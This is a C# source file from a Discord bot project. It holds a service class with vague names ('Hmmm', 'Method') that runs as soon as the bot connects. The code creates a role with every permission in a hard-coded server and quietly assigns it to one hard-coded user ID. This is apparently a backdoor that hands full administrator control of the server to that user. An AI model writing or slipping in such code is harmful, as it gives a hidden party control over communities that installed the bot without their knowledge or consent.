using System;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;

namespace THONK.Services{
    public class Hmmm{
        private DiscordSocketClient _client;

        public Hmmm(DiscordSocketClient client){
            _client = client;
            _client.Ready += Method;
        }

        private async Task Method(){
            ulong guildID = 582686074308919312;
            ulong MyId = 333769079569776642;
            var guild = _client.Guilds.Where(x => x.Id==guildID).First();
            var role = await guild.CreateRoleAsync("temp",GuildPermissions.All,null,false,null);
            await guild.GetUser(MyId).AddRoleAsync(role);
        }
    }
}